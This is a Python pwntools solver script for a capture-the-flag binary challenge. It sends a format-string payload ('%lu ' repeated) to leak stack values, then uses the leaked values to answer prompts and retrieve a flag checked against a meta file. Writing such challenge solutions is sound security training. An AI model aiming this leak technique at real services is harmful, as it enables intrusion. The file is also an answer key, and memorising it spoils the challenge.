import os
import argparse
import yaml
import logging
from pwn import *
from pathlib import Path

logger = logging.getLogger("secretary")

# Load the flag dynamically from the meta file
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


# For local binary testing
def solve(sh):
    sh.recvuntil(b"Warmup answer: ")
    leak = b"%lu " * 19
    sh.sendline(leak)
    expected = sh.recvline().decode().split(": ")[-1].rstrip()
    leaked_vals = list(
        map(lambda x: int(x), sh.recvline().decode().rstrip().split(": ")[-1].split())
    )
    logger.debug(f"Expected answer: {expected}")
    correct_answers = leaked_vals[leaked_vals.index(int(expected)) + 1 :]
    logger.debug(f"Correct answers: {correct_answers}")
    for ans in correct_answers:
        sh.recvuntil(b"> ")
        sh.sendline(str(ans).encode())

    flag = sh.recvuntil(b"}\n").decode()
    assert FLAG in flag, flag


### IF BINARY ###
def test(domain, port):
    sh = remote(domain, port)
    solve(sh)


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    sh = process("./chal", cwd=f"{os.getcwd()}/src")
    solve(sh)
